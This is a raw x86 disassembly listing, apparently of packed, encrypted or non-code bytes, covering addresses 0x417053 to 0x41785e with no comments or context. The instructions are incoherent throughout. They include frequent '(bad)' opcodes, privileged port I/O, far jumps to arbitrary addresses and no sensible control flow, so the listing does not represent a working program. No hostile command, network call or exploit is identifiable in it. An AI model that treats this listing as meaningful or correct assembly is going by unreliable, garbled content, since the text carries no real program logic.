  417053:	dec    ebp
  417054:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417055:	or     ebp,ecx
  417057:	adc    cl,ch
  417059:	mov    bl,BYTE PTR [ecx+edx*8-0x2adc4656]
  417060:	jmp    0x93c95b16
  417065:	adc    DWORD PTR [ebp+ecx*8-0x4a717317],0xffffffdd
  41706d:	iret   
  41706e:	pop    edx
  41706f:	dec    esi
  417070:	xor    al,0x0
  417072:	jmp    0x417040
  417074:	mov    al,ds:0xe92eb56c
  417079:	add    edx,DWORD PTR [edi+0x286c9c4e]
  41707f:	fldl2t 
  417081:	add    edi,DWORD PTR [edi]
  417083:	sbb    ebp,DWORD PTR [eax+0x1b236200]
  417089:	mov    ecx,DWORD PTR [esi-0x4b]
  41708c:	fisttp QWORD PTR [edx+0xc23bdb5]
  417092:	xor    esi,DWORD PTR [esi-0x26962997]
  417098:	sbb    eax,0xab4e12f1
  41709d:	mov    edx,DWORD PTR [edx*8+0x70f5086e]
  4170a4:	push   edi
  4170a5:	stos   BYTE PTR es:[edi],al
  4170a6:	xchg   ebp,eax
  4170a7:	jns    0x4170d0
  4170a9:	sbb    ebp,DWORD PTR [ecx+edx*8]
  4170ac:	mul    DWORD PTR [esi+0x2b]
  4170af:	and    ch,BYTE PTR [edi+0x46]
  4170b2:	mov    dl,BYTE PTR [edx+ebp*8]
  4170b5:	add    eax,DWORD PTR [eax]
  4170b7:	bound  ebx,QWORD PTR [edx]
  4170b9:	mov    ah,0x41
  4170bb:	data16 fstp DWORD PTR [esi-0x40]
  4170bf:	inc    ecx
  4170c0:	aad    0x9b
  4170c2:	mov    cl,BYTE PTR [ebp+0x11]
  4170c5:	outs   dx,DWORD PTR ds:[esi]
  4170c6:	scas   al,BYTE PTR es:[edi]
  4170c7:	popa   
  4170c8:	add    bp,sp
  4170cb:	jecxz  0x41712f
  4170cd:	inc    ebx
  4170ce:	loope  0x4170aa
  4170d0:	fnstsw WORD PTR [esi-0x1e]
  4170d3:	stos   DWORD PTR es:[edi],eax
  4170d4:	jmp    0x4170dd
  4170d6:	mov    ecx,0x10528ea
  4170db:	sbb    al,0x42
  4170dd:	add    ch,cl
  4170df:	mov    eax,0xe2292edb
  4170e4:	cdq    
  4170e5:	jne    0x4170bf
  4170e7:	lods   al,BYTE PTR ds:[esi]
  4170e8:	daa    
  4170e9:	or     DWORD PTR [edx-0x44],esp
  4170ec:	loopne 0x4170af
  4170ee:	or     esp,DWORD PTR [eax+0x64]
  4170f1:	dec    ebx
  4170f2:	in     eax,dx
  4170f3:	mov    DWORD PTR [ebp+0x1661e8aa],ecx
  4170f9:	pop    ebx
  4170fa:	stos   DWORD PTR es:[edi],eax
  4170fb:	in     eax,dx
  4170fc:	js     0x417085
  4170fe:	xor    eax,0x1837dd42
  417103:	outs   dx,BYTE PTR ds:[esi]
  417104:	jmp    0xcbc1:0xe10e700a
  41710b:	arpl   WORD PTR [edx-0x3e],bx
  41710e:	in     eax,0x39
  417110:	xor    DWORD PTR [edx+0x59b61e8],ebp
  417116:	jmp    0x3a4bd309
  41711b:	add    BYTE PTR [ecx+0x20],ah
  41711e:	cmp    eax,0x1938e134
  417123:	imul   ah
  417125:	mov    eax,0xe4eefc
  41712a:	jmp    0x41714b
  41712c:	popa   
  41712d:	cmp    BYTE PTR [eax+0x53cd421d],cl
  417133:	jo     0x4170f2
  417135:	mov    esp,0x54fd5110
  41713a:	add    ecx,ebp
  41713c:	push   eax
  41713d:	jbe    0x4170c7
  41713f:	xor    edx,esp
  417141:	test   BYTE PTR [ebx+0x0],bh
  417144:	or     al,0x82
  417146:	add    al,0x33
  417148:	lea    esi,[ecx+ebp*2]
  41714b:	mul    BYTE PTR [ebx-0x24]
  41714e:	je     0x417174
  417150:	sub    ebp,DWORD PTR [edx+ebp*2]
  417153:	add    ch,bh
  417155:	push   cs
  417156:	adc    BYTE PTR [ebp+ebp*1-0x64],dh
  41715a:	cld    
  41715b:	cmp    BYTE PTR [edi-0x20],0x89
  41715f:	enter  0x1e20,0x80
  417163:	shl    cl,0xe3
  417166:	pop    eax
  417167:	movsx  esp,WORD PTR [ebx]
  41716a:	cmp    cl,bl
  41716c:	mov    es,WORD PTR [esi-0x590ba9af]
  417172:	and    BYTE PTR [eax],ah
  417174:	add    al,0x88
  417176:	pop    esp
  417177:	push   ss
  417178:	dec    ebx
  417179:	fld    QWORD PTR [ecx-0x3f08f83c]
  41717f:	je     0x417181
  417181:	repz add DWORD PTR [eax+ebx*2],0xf7b5de8c
  417189:	pusha  
  41718a:	sub    BYTE PTR [ebp-0x42],bh
  41718d:	push   ebx
  41718e:	push   cs
  41718f:	inc    BYTE PTR [eax]
  417191:	mov    ebx,0x205d5e2c
  417196:	xor    al,0xc2
  417198:	or     bl,cl
  41719a:	xchg   ebp,eax
  41719b:	mov    edi,eax
  41719d:	loopne 0x4171a8
  41719f:	push   edx
  4171a0:	push   esi
  4171a1:	test   BYTE PTR [ebp+esi*2+0x24],ah
  4171a5:	xchg   edi,eax
  4171a6:	inc    esp
  4171a7:	imul   esi,esi,0x8b3460b3
  4171ad:	cmp    al,0xd1
  4171af:	add    edi,eax
  4171b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171b2:	fs push ecx
  4171b4:	adc    al,0x88
  4171b6:	stos   DWORD PTR es:[edi],eax
  4171b7:	cmp    BYTE PTR [ecx+0x7f],0xdb
  4171bb:	je     0x4171c7
  4171bd:	(bad)  
  4171be:	sti    
  4171bf:	mov    eax,0xc0fb4215
  4171c4:	adc    eax,0x890d0b86
  4171c9:	mov    dh,0x8e
  4171cb:	sub    BYTE PTR [ecx-0x7cdb695a],cl
  4171d1:	and    ch,BYTE PTR ds:0xec250102
  4171d7:	enter  0x4e23,0xfd
  4171db:	inc    edi
  4171dc:	je     0x41723e
  4171de:	stc    
  4171df:	neg    DWORD PTR [esp+eax*4+0x2b]
  4171e3:	inc    edx
  4171e4:	or     BYTE PTR [eax],al
  4171e6:	bound  edx,QWORD PTR [ebp-0x77]
  4171e9:	in     al,dx
  4171ea:	loope  0x4171d0
  4171ec:	and    BYTE PTR [esi-0x4b],dl
  4171ef:	scas   eax,DWORD PTR es:[edi]
  4171f0:	in     al,0x70
  4171f2:	sahf   
  4171f3:	adc    BYTE PTR [esi+0x80631c],0x55
  4171fa:	jmp    0x4171c9
  4171fc:	in     al,0x70
  4171fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171ff:	adc    BYTE PTR [ebp+0x13],0x3a
  417203:	jae    0x4171c5
  417205:	jmp    esi
  417207:	inc    eax
  417208:	add    eax,0x817684
  41720d:	add    cl,ah
  41720f:	ins    DWORD PTR es:[edi],dx
  417210:	shl    BYTE PTR [eax+0x1e],1
  417213:	add    BYTE PTR [edx],0xd
  417216:	out    0x6f,eax
  417218:	(bad)  
  417219:	jmp    DWORD PTR [edx+0x20]
  41721c:	fidiv  DWORD PTR [ebx+0x26]
  41721f:	adc    BYTE PTR [edi+edi*8],0x2e
  417223:	scas   eax,DWORD PTR es:[edi]
  417224:	lahf   
  417225:	fs adc esp,eax
  417228:	add    al,0x81
  41722a:	call   0xd1d8:0xc327cb7d
  417231:	inc    ebx
  417232:	(bad)  
  417233:	std    
  417234:	aas    
  417235:	jae    0x4172a5
  417237:	fldcw  WORD PTR [ebx]
  417239:	dec    BYTE PTR ds:0x6d03a5ea
  41723f:	and    DWORD PTR [ecx+0x3],0x5b66d962
  417246:	pop    ebp
  417247:	jmp    0xb4db:0x5a0080ec
  41724e:	aam    0x27
  417250:	fcom   QWORD PTR [ecx-0x18265e30]
  417256:	push   0xfd225ab4
  41725b:	mov    al,0xe8
  41725d:	dec    eax
  41725e:	jmp    0x417212
  417260:	sbb    eax,0xec227eea
  417265:	loopne 0x4172a4
  417267:	popa   
  417268:	adc    DWORD PTR [edi-0x41],esi
  41726b:	adc    eax,0xe2b40eda
  417270:	jo     0x41725b
  417272:	into   
  417273:	stos   DWORD PTR es:[edi],eax
  417274:	lahf   
  417275:	in     eax,0xbb
  417277:	jb     0x417296
  417279:	jmp    0x7606:0x1e080b09
  417280:	fst    QWORD PTR ds:0x89207107
  417286:	call   0x872b8fdd
  41728b:	fcmovu st,st(3)
  41728d:	xor    al,0xf6
  41728f:	loop   0x417244
  417291:	inc    ecx
  417292:	xlat   BYTE PTR ds:[ebx]
  417293:	and    ecx,ebx
  417295:	out    0xd8,eax
  417297:	ja     0x417238
  417299:	in     eax,dx
  41729a:	stos   DWORD PTR es:[edi],eax
  41729b:	xor    bl,BYTE PTR ds:0xc3bb06ea
  4172a1:	dec    sp
  4172a3:	pop    esp
  4172a4:	in     al,dx
  4172a5:	sar    DWORD PTR [esi+0x69],0x1
  4172a9:	test   edi,0xd9b15c95
  4172af:	add    BYTE PTR [edi+ebx*4+0x1],ah
  4172b3:	in     al,dx
  4172b4:	mov    ecx,0x6ae944e8
  4172b9:	adc    BYTE PTR [esi],0xf6
  4172bc:	fcmovnu st,st(1)
  4172be:	pop    eax
  4172bf:	fisub  DWORD PTR [ebp-0x4811958b]
  4172c5:	pop    eax
  4172c6:	cli    
  4172c7:	call   0x8c00902c
  4172cc:	push   es
  4172cd:	jmp    0xc506:0x2e60e944
  4172d4:	sub    al,0x19
  4172d6:	add    edx,edi
  4172d8:	jle    0x4172ce
  4172da:	cmp    eax,0x1190c95
  4172df:	push   ds
  4172e0:	xchg   ecx,eax
  4172e1:	fld    DWORD PTR [eax]
  4172e3:	out    0x18,al
  4172e5:	xor    al,0x63
  4172e7:	dec    edx
  4172e8:	int3   
  4172e9:	jmp    0x772b5c32
  4172ee:	add    ecx,ebp
  4172f0:	popa   
  4172f1:	sti    
  4172f2:	cmp    esp,ebp
  4172f4:	sub    eax,0x18e944e9
  4172f9:	enter  0x2062,0x63
  4172fd:	jmp    0x417373
  4172ff:	and    eax,0x890ce866
  417304:	or     eax,0x7e944e9
  417309:	push   ss
  41730a:	jo     0x417339
  41730c:	pop    esi
  41730d:	add    BYTE PTR [ebx],0x71
  417310:	bound  edx,QWORD PTR ds:0x5e002d70
  417316:	pusha  
  417317:	dec    esi
  417318:	(bad)  
  417319:	div    BYTE PTR [ebp+0x16]
  41731c:	int    0xac
  41731e:	mov    ah,0x0
  417320:	pop    es
  417321:	sub    eax,0x270fdd20
  417326:	loopne 0x417382
  417328:	sbb    ch,BYTE PTR [edx-0x75ff538c]
  41732e:	adc    ebp,DWORD PTR [esi]
  417330:	xor    edx,edx
  417332:	retf   
  417333:	rcl    BYTE PTR [esi+0x55],0x3c
  417337:	push   edi
  417338:	jae    0x417381
  41733a:	fisttp QWORD PTR [ebx-0x48]
  41733d:	cld    
  41733e:	push   es
  41733f:	add    DWORD PTR [eax],eax
  417341:	mov    ah,0xf0
  417343:	pop    es
  417344:	pop    eax
  417345:	mov    BYTE PTR [esp+edi*8+0x71443e87],bl
  41734c:	inc    esp
  41734d:	dec    ebx
  41734e:	and    BYTE PTR [ecx-0x363f7a2],0xfe
  417355:	es jl  0x41736e
  417358:	inc    eax
  417359:	dec    ebx
  41735a:	pop    ebx
  41735b:	lds    ecx,FWORD PTR [ecx+ebx*1]
  41735e:	sbb    BYTE PTR [esi+0x5e],bl
  417361:	jb     0x41737e
  417363:	repz add eax,0x40911b
  417369:	or     dl,BYTE PTR [ecx-0x5b62a9d1]
  41736f:	jo     0x4173b5
  417371:	sti    
  417372:	xor    ebp,edi
  417374:	adc    eax,0x3c6dbf
  417379:	add    ch,dh
  41737b:	(bad)  [eax]
  41737d:	jne    0x4173c6
  41737f:	(bad)  
  417381:	je     0x417377
  417383:	packsswb mm7,mm6
  417386:	or     al,0xa
  417388:	test   eax,eax
  41738a:	aaa    
  41738b:	xlat   BYTE PTR ds:[ebx]
  41738c:	and    DWORD PTR ds:0x408c67,0x200857bb
  417396:	xchg   BYTE PTR [ecx+0xa5500fc],ah
  41739c:	adc    BYTE PTR [eax-0x47],al
  41739f:	xchg   edi,eax
  4173a0:	cld    
  4173a1:	pop    ebp
  4173a2:	sbb    eax,DWORD PTR [ebp+0x71]
  4173a5:	inc    esp
  4173a6:	bound  eax,QWORD PTR [edx-0x5d9809bb]
  4173ac:	rol    DWORD PTR [ebx+0x62],cl
  4173af:	adc    ebx,0xd0b43432
  4173b5:	jae    0x4173d5
  4173b7:	cmp    BYTE PTR [edx-0xd29a804],0x3f
  4173be:	bound  edx,QWORD PTR [esp+eax*1]
  4173c1:	and    bh,dh
  4173c3:	cmp    eax,0x72eeff00
  4173c8:	pop    eax
  4173c9:	and    bl,BYTE PTR [esp+0x52]
  4173cd:	test   BYTE PTR [edx],ah
  4173cf:	xor    eax,0xdc878102
  4173d4:	rol    DWORD PTR [ebx+0x62],cl
  4173d7:	add    BYTE PTR [eax-0x3bd27df5],0xff
  4173de:	add    BYTE PTR [edx+0x32],ah
  4173e1:	push   ecx
  4173e2:	adc    esp,DWORD PTR [edx-0x78003f92]
  4173e8:	and    BYTE PTR [ecx+0x4580a670],dh
  4173ee:	push   ebx
  4173ef:	jmp    0x683723c0
  4173f4:	mov    al,ds:0x816243d3
  4173f9:	shl    DWORD PTR [edx],cl
  4173fb:	xchg   esp,eax
  4173fc:	ret    0x73d0
  4173ff:	sahf   
  417400:	cmp    BYTE PTR [edx-0xd3ba804],0x3f
  417407:	bound  edx,QWORD PTR [edx-0x43a8dffd]
  41740d:	add    al,0xff
  41740f:	dec    esi
  417410:	xchg   ebx,eax
  417411:	pop    eax
  417412:	fcmove st,st(7)
  417414:	xor    edx,DWORD PTR [ecx-0x7c]
  417417:	mov    ds:0x8780feb4,al
  41741c:	(bad)  
  41741e:	inc    ebx
  41741f:	(bad)  
  417420:	fldl2t 
  417422:	sbb    DWORD PTR [ecx-0x47],0x14
  417426:	enter  0xd9a5,0x3b
  41742a:	push   ecx
  41742b:	jno    0x417446
  41742d:	clc    
  41742e:	ret    
  41742f:	xchg   ebp,eax
  417430:	adc    al,0x67
  417432:	out    0x89,al
  417434:	fst    DWORD PTR [ecx]
  417436:	and    al,0xe7
  417438:	sbb    edx,ebp
  41743a:	push   eax
  41743b:	push   ecx
  41743c:	(bad)
  41743f:	jne    0x41749e
  417441:	sub    dl,bh
  417443:	add    BYTE PTR [edx],ch
  417445:	add    DWORD PTR [esi],ebx
  417447:	jno    0x41746b
  417449:	fnstcw WORD PTR [ecx-0x8568eb0]
  41744f:	ret    
  417450:	push   ebp
  417451:	pop    ebp
  417452:	sub    dl,bh
  417454:	jp     0x4174ba
  417456:	lods   eax,DWORD PTR ds:[esi]
  417457:	dec    edi
  417458:	xchg   ebp,eax
  417459:	loop   0x4174d5
  41745b:	(bad)  
  41745c:	mov    bh,0xed
  41745e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41745f:	add    esp,DWORD PTR [ebp-0x4e01a51e]
  417465:	in     eax,dx
  417466:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417467:	add    edx,DWORD PTR [ebp-0x6d24228e]
  41746d:	sbb    eax,0xfd5150ea
  417472:	jbe    0x41743b
  417474:	or     eax,0x2a581a73
  417479:	into   
  41747a:	sub    DWORD PTR [ecx+eiz*4],esp
  41747d:	jne    0x4174a0
  41747f:	inc    esp
  417480:	jmp    0x41749d
  417482:	out    0x3d,al
  417484:	and    ecx,DWORD PTR [ebx]
  417486:	outs   dx,DWORD PTR ds:[esi]
  417487:	push   ebp
  417488:	js     0x4174fc
  41748a:	cmp    al,0x4f
  41748c:	jno    0x4174ef
  41748e:	clc    
  41748f:	ret    
  417490:	aad    0x5c
  417492:	stos   BYTE PTR es:[edi],al
  417493:	fdiv   DWORD PTR [ebx-0x4c]
  417496:	imul   eax,DWORD PTR [edx+eiz*2],0xb93d00d9
  41749d:	or     edi,esp
  41749f:	aam    0x49
  4174a1:	mov    DWORD PTR [eax-0x17],0xaa5b9950
  4174a8:	add    BYTE PTR [ecx],ch
  4174aa:	fwait
  4174ab:	pop    ebx
  4174ac:	stos   BYTE PTR es:[edi],al
  4174ad:	loope  0x417433
  4174af:	sbb    eax,0x880bdb3a
  4174b4:	mov    ds:0x7e697e71,eax
  4174b9:	xchg   edx,eax
  4174ba:	jno    0x4174b8
  4174bc:	add    ebp,DWORD PTR ds:0x5f035006
  4174c2:	je     0x4174da
  4174c4:	and    eax,0x7200b16a
  4174c9:	push   cs
  4174ca:	pop    eax
  4174cb:	sti    
  4174cc:	call   0x27c92e06
  4174d1:	add    al,0x14
  4174d3:	pop    eax
  4174d4:	push   0xffffff9a
  4174d6:	int    0xbe
  4174d8:	icebp  
  4174d9:	popa   
  4174da:	pop    edx
  4174db:	jge    0x4174ea
  4174dd:	ss retf 
  4174df:	je     0x417520
  4174e1:	jecxz  0x4174f8
  4174e3:	and    eax,0x166df1f5
  4174e8:	and    DWORD PTR [ecx],esi
  4174ea:	mov    cl,0x0
  4174ec:	sub    bh,BYTE PTR fs:[ebp-0x335b46f4]
  4174f3:	cmp    ch,bl
  4174f5:	and    DWORD PTR [ecx+0x6a],esi
  4174f8:	call   0x649780c7
  4174fd:	sub    bh,BYTE PTR [ebp-0x335b66e4]
  417503:	add    al,0xfd
  417505:	and    DWORD PTR [ecx-0x7b],esi
  417508:	test   eax,0x83e89e0a
  41750d:	add    BYTE PTR [edi],dl
  41750f:	(bad)
  417514:	xor    BYTE PTR [eax],al
  417516:	test   al,0x9c
  417518:	cld    
  417519:	push   ebp
  41751a:	add    al,0x72
  41751c:	xchg   esp,eax
  41751d:	adc    cl,BYTE PTR [ebx+0x5ac35ad5]
  417523:	xchg   ebx,eax
  417524:	cld    
  417525:	addr16 mov ebx,0xc40010dc
  41752b:	jno    0x417555
  41752d:	adc    ecx,DWORD PTR [ebx-0x2b]
  417530:	jg     0x4174f2
  417532:	outs   dx,DWORD PTR ds:[esi]
  417533:	jae    0x417581
  417535:	jmp    FWORD PTR [esi+0x7b400f04]
  41753b:	dec    esp
  41753c:	cld    
  41753d:	ret    0x1cb9
  417540:	ret    0x3ff6
  417543:	rol    DWORD PTR [ecx+eax*1],0xad
  417547:	repz jmp 0x417511
  41754a:	jge    0x4175c8
  41754c:	popf   
  41754d:	inc    eax
  41754e:	dec    ebx
  41754f:	mov    bh,bh
  417551:	out    0xb0,eax
  417553:	inc    ecx
  417554:	cld    
  417555:	call   eax
  417557:	push   ss
  417558:	pop    ebx
  417559:	ret    0xdc3f
  41755c:	push   edx
  41755d:	push   edi
  41755e:	and    eax,ebx
  417560:	xchg   DWORD PTR [ecx+0xb],esi
  417563:	aas    
  417564:	mov    DWORD PTR [esi+0x7b],ecx
  417567:	adc    al,0xe0
  417569:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41756a:	cmp    bl,ah
  41756c:	mov    DWORD PTR [esi+0x6b],ecx
  41756f:	adc    al,0xd8
  417571:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417572:	add    BYTE PTR [edx],cl
  417574:	fmul   QWORD PTR [ecx-0x60598cf2]
  41757a:	add    ebx,edi
  41757c:	pop    eax
  41757d:	jae    0x417583
  41757f:	les    edx,FWORD PTR [eax+0x1ae55fe1]
  417585:	push   edx
  417586:	push   esi
  417587:	sub    al,0xf2
  417589:	repz xor esp,DWORD PTR [eax]
  41758c:	push   ss
  41758d:	push   es
  41758e:	push   esp
  41758f:	(bad)  
  417590:	out    0xc4,eax
  417592:	(bad)  
  417593:	jmp    0x4566:0x2d86fcbe
  41759a:	inc    ebp
  41759b:	pop    esi
  41759c:	jb     0x41753e
  41759e:	inc    eax
  41759f:	bound  ebx,QWORD PTR [edx]
  4175a1:	rcr    DWORD PTR [edx+eiz*1+0x56457b82],0xea
  4175a9:	lods   eax,DWORD PTR ds:[esi]
  4175aa:	sbb    ebx,ebx
  4175ac:	scas   al,BYTE PTR es:[edi]
  4175ad:	and    al,0x87
  4175af:	cmp    eax,0x4a5d779e
  4175b4:	mov    dl,0x42
  4175b6:	inc    ebp
  4175b7:	jb     0x417610
  4175b9:	dec    esi
  4175ba:	adc    esp,edx
  4175bc:	xchg   ebx,eax
  4175bd:	sar    bh,0xee
  4175c0:	outs   dx,BYTE PTR ds:[esi]
  4175c1:	sbb    al,0x89
  4175c3:	mov    WORD PTR [eax-0x7d9dffce],gs
  4175c9:	pop    eax
  4175ca:	jmp    0x4175e9
  4175cc:	cmovle eax,DWORD PTR [edi+0x5d77dcd5]
  4175d3:	mov    dh,BYTE PTR [esi+0x63001bc5]
  4175d9:	mov    edi,0x80881fc5
  4175de:	add    BYTE PTR [eax],al
  4175e0:	jmp    0x999f23a4
  4175e5:	ret    
  4175e6:	mov    dl,0x88
  4175e8:	xor    ecx,ecx
  4175ea:	clc    
  4175eb:	jmp    DWORD PTR ds:0x46445681
  4175f1:	js     0x4175f2
  4175f3:	jae    0x417652
  4175f5:	sti    
  4175f6:	cmp    ch,al
  4175f8:	stos   BYTE PTR es:[edi],al
  4175f9:	sbb    eax,0xb6d90000
  4175fe:	stos   BYTE PTR es:[edi],al
  4175ff:	shl    DWORD PTR [esi-0x80],0xaf
  417603:	dec    esi
  417604:	mov    ebx,?
  417606:	dec    edi
  417607:	push   ebp
  417608:	xor    ecx,ebx
  41760a:	loop   0x417686
  41760c:	outs   dx,BYTE PTR ds:[esi]
  41760d:	mov    ch,0xed
  41760f:	inc    esp
  417610:	fs add eax,0xb1d5c373
  417616:	dec    ebx
  417617:	add    BYTE PTR [esi+eax*1+0x17],dl
  41761b:	mov    bh,0xda
  41761d:	pslld  mm0,QWORD PTR [eax+0x3d9b546]
  417624:	jmp    0x4175fb
  417626:	outs   dx,BYTE PTR ds:[esi]
  417627:	sub    BYTE PTR [edx],0xe1
  41762a:	jmp    0x16a3bc04
  41762f:	sub    BYTE PTR [edx-0x56],dh
  417632:	test   BYTE PTR [eax+0x2a],bh
  417635:	aad    0xe6
  417637:	ds jp  0x4175f4
  41763a:	or     BYTE PTR [eax+eax*1-0x79],0x62
  41763f:	out    0x88,al
  417641:	and    al,0x5a
  417643:	lods   eax,DWORD PTR ds:[esi]
  417644:	jecxz  0x417680
  417646:	jmp    0x62bd482c
  41764b:	fisub  WORD PTR [edi]
  41764d:	dec    esi
  41764e:	(bad)  
  41764f:	dec    BYTE PTR [eax-0x9216e1f]
  417655:	jmp    0x62ed:0x6344e621
  41765c:	ret    
  41765d:	inc    ebp
  41765e:	jbe    0x417697
  417660:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417661:	cmp    eax,0x4a385f6e
  417666:	jge    0x4175ee
  417668:	add    ah,BYTE PTR [edx+0x16]
  41766b:	(bad)  
  41766d:	pop    ecx
  41766e:	jmp    0x4176bc
  417670:	scas   al,BYTE PTR es:[edi]
  417671:	mov    edx,0xfdefa45c
  417676:	mov    bh,0x10
  417678:	dec    esp
  417679:	punpckldq mm6,DWORD PTR [ebx+edi*8-0x819e8e2]
  417681:	fstp   QWORD PTR [eax]
  417683:	add    ecx,ebp
  417685:	cdq    
  417686:	mov    ds:0xc61e8a5,al
  41768b:	(bad)  
  41768c:	out    dx,eax
  41768d:	add    DWORD PTR [ebp+0x41],ecx
  417690:	jmp    0xaa9b7da0
  417695:	adc    esp,DWORD PTR [ecx-0x13]
  417698:	cmp    BYTE PTR [eax],dl
  41769a:	add    BYTE PTR ds:0x366c5e53,cl
  4176a0:	xor    DWORD PTR [eax],eax
  4176a2:	test   eax,0xf620119
  4176a7:	ins    BYTE PTR es:[edi],dx
  4176a8:	push   ss
  4176a9:	lods   eax,DWORD PTR ds:[esi]
  4176aa:	mov    dh,0xad
  4176ac:	add    BYTE PTR [esi+ebx*1-0x1b],ch
  4176b0:	adc    BYTE PTR [edx-0x7a],ch
  4176b3:	fld    DWORD PTR [eax]
  4176b5:	push   0x7e
  4176b7:	aad    0x0
  4176b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176ba:	data16 std 
  4176bc:	fwait
  4176bd:	sub    DWORD PTR [esi-0x80],ebx
  4176c0:	(bad)  
  4176c1:	mov    ecx,0x75465621
  4176c6:	jecxz  0x417660
  4176c8:	jne    0x417682
  4176ca:	jmp    0x8871:0xb374051e
  4176d1:	call   0xe592e4ed
  4176d6:	fdiv   QWORD PTR [ecx-0x4]
  4176d9:	aad    0x4d
  4176db:	cmp    eax,0x62385202
  4176e0:	jbe    0x41771f
  4176e2:	jecxz  0x417747
  4176e4:	jne    0x4176c2
  4176e6:	mov    ah,0x1b
  4176e8:	add    eax,0x9bed6026
  4176ed:	test   eax,0x45658161
  4176f2:	fld    DWORD PTR [bx-0x49d9]
  4176f7:	adc    BYTE PTR [ebp-0x3f589e18],ah
  4176fd:	add    BYTE PTR [ebp+0x6f83c1ad],bh
  417703:	lea    edx,[ecx+0x55]
  417706:	add    ch,dl
  417708:	jmp    0x4176dd
  41770a:	mov    ecx,edi
  41770c:	int3   
  41770d:	js     0x417766
  41770f:	jb     0x417745
  417711:	and    BYTE PTR [ebx+esi*4],dl
  417714:	jo     0x4176ab
  417716:	add    bl,cl
  417718:	jmp    0x417702
  41771a:	test   DWORD PTR [esi],ecx
  41771c:	jo     0x4176ac
  41771e:	outs   dx,DWORD PTR ds:[esi]
  41771f:	mov    edx,0x208300d8
  417724:	jno    0x417721
  417726:	push   cs
  417727:	dec    ecx
  417728:	jns    0x417725
  41772a:	(bad)  
  41772b:	mov    ebx,0x63246553
  417730:	aad    0x31
  417732:	ror    BYTE PTR [esi],0x94
  417735:	and    BYTE PTR [eax+eiz*1],bl
  417738:	dec    ebx
  417739:	addr16 push eax
  41773b:	and    cl,dh
  41773d:	inc    esp
  41773e:	and    al,0xaf
  417740:	mov    ?,esp
  417742:	dec    edi
  417743:	shl    DWORD PTR [ebp+0x538b02aa],cl
  417749:	lds    ecx,FWORD PTR [ecx+ebp*4]
  41774c:	mov    ebx,0xa1574c89
  417751:	mov    ebp,edx
  417753:	mov    bl,0x24
  417755:	cmc    
  417756:	add    DWORD PTR [ebx+0x6f],ecx
  417759:	mov    dh,0xcb
  41775b:	scas   al,BYTE PTR es:[edi]
  41775c:	pushf  
  41775d:	and    BYTE PTR [eax],bl
  41775f:	into   
  417760:	fmul   QWORD PTR [edx-0x3ea6ba77]
  417766:	vmptrld QWORD PTR [ebx+edi*8-0x1]
  41776b:	add    BYTE PTR [ebx],bh
  41776d:	icebp  
  41776e:	jl     0x417794
  417770:	adc    esi,ecx
  417772:	add    al,0x6d
  417774:	or     ebx,eax
  417776:	add    BYTE PTR [eax],al
  417778:	(bad)  
  417779:	cmc    
  41777a:	add    ecx,DWORD PTR [ebp+0x73bd72db]
  417780:	dec    edi
  417781:	sub    esp,ecx
  417783:	daa    
  417784:	stos   DWORD PTR es:[edi],eax
  417785:	in     eax,0xe
  417787:	std    
  417788:	sub    al,0x63
  41778a:	in     al,dx
  41778b:	inc    ebx
  41778c:	push   esi
  41778d:	inc    edx
  41778e:	add    BYTE PTR [ecx+0x91635c],cl
  417794:	xchg   DWORD PTR [ebx-0x4d9dfffb],ecx
  41779a:	dec    ecx
  41779b:	adc    esp,DWORD PTR [edx]
  41779d:	data16 sar bh,0xd8
  4177a1:	arpl   WORD PTR [ebx],bx
  4177a3:	std    
  4177a4:	bound  eax,QWORD PTR [edx-0x7f149a00]
  4177aa:	pop    ebp
  4177ab:	adc    ch,BYTE PTR [ebp+0x1e134963]
  4177b1:	outs   dx,BYTE PTR ds:[esi]
  4177b2:	sar    bh,0x88
  4177b5:	imul   ecx,DWORD PTR [ecx+0x36],0x13c06c95
  4177bc:	and    al,BYTE PTR [edx-0x62f12684]
  4177c2:	dec    ecx
  4177c3:	xor    eax,0x8020a57d
  4177c8:	bound  eax,QWORD PTR [edx-0x4cb0300]
  4177ce:	jmp    0x41782f
  4177d0:	add    BYTE PTR [edx+eax*2+0x0],cl
  4177d4:	and    DWORD PTR [esi],0xcfc07b7d
  4177da:	jne    0x417859
  4177dc:	push   cs
  4177dd:	cmp    cl,BYTE PTR [eax+0x45ffa5]
  4177e3:	pop    ds
  4177e4:	add    cl,ah
  4177e6:	rol    DWORD PTR [esi+edi*8],cl
  4177e9:	and    DWORD PTR [ecx],eax
  4177eb:	dec    esi
  4177ec:	add    al,0x5d
  4177ee:	(bad)  
  4177ef:	mov    ds:0x22da25fc,eax
  4177f4:	ja     0x41778c
  4177f6:	mov    ch,0x1
  4177f8:	inc    ecx
  4177f9:	sahf   
  4177fa:	mov    ch,0x95
  4177fc:	dec    DWORD PTR ds:0x6c7cea6b
  417802:	push   esp
  417803:	sbb    al,dl
  417805:	cdq    
  417806:	pop    esp
  417807:	pushf  
  417808:	adc    edx,DWORD PTR [ebx+0x1d636f5e]
  41780e:	jnp    0x4177a3
  417810:	adc    al,0x1d
  417812:	sub    BYTE PTR [esi+0x716add61],0xc4
  417819:	lds    edx,FWORD PTR [edx+ebp*4-0x32]
  41781d:	arpl   WORD PTR [eax+0x5e647ce6],di
  417823:	stos   DWORD PTR es:[edi],eax
  417824:	jle    0x4177e5
  417826:	lock out dx,al
  417828:	jl     0x4177d5
  41782a:	cmp    DWORD PTR [ebp+0x64d9626e],0xd6c52a43
  417834:	cmp    al,BYTE PTR [eax]
  417836:	loope  0x4177d1
  417838:	sbb    al,0x1b
  41783a:	cld    
  41783b:	push   ebp
  41783c:	(bad)  
  41783d:	mov    esp,0xc2e2e20e
  417842:	dec    edx
  417843:	mov    eax,ds:0xce8b5006
  417848:	ins    BYTE PTR es:[edi],dx
  417849:	fldenv ds:0x937d1b04
  41784f:	xor    BYTE PTR [ecx+0x51d96246],al
  417855:	test   BYTE PTR [eax+ebx*8-0x17],al
  417859:	jp     0x4177f7
  41785b:	sbb    DWORD PTR [ebp+0x43],ebp
  41785e:	rcl    esi,1
